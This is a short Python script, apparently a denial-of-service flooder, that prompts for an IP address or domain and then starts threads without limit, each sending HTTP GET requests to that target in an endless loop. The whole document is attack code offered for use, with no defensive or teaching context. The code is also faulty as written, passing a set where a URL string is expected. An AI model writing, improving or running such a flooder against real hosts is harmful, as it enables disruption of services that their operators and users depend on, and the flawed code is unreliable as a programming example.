import threading
import requests
url = input("IP/Domain: ")
def dos():
 while True:
  requests.get({url})
  
while True:
 threading.Thread(target=dos).start()
